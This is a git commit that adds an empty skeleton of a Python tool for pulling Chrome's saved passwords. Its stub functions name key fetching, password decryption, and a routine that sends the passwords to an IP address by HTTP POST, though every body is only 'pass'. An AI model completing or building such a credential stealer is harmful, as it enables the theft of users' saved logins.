302d23079d0ad65bcefeefca773d3bf995ae8050
Aleksa Zatezalo <zabumaphu@gmail.com>
2025-05-27 21:44:18 +0200

    Skeleton created

---
+++ password.py
@@ -0,0 +1,50 @@
+"""
+Author: Aleksa Zatezalo
+Date: May 2025
+Description: Extracts Chrome Passwords
+"""
+
+
+# Password fetching functions
+def chrome_date_and_time(chrome_data):
+    """
+    Returns date and time from google chrome datafile.
+    """
+
+    pass
+
+def fetching_encryption_key():
+    """
+    Gets the chrome encryption key.
+    """
+
+    pass
+
+def password_decryption(passord, encryption_key):
+    """
+    Decrypts a password using the chrome decryption key.
+    """
+
+    pass
+
+def fetch_passwords():
+    """
+    Fetches passwords from chrome.
+    """
+
+    pass
+
+
+# Exfiltrate password functionality
+def send_passwords(ip, data):
+    """
+    Sends passwords to IP address via HTTP post request.
+    """
+
+    pass
+
+def main():
+    pass
+
+if __name__ == "__main__":
+    main()
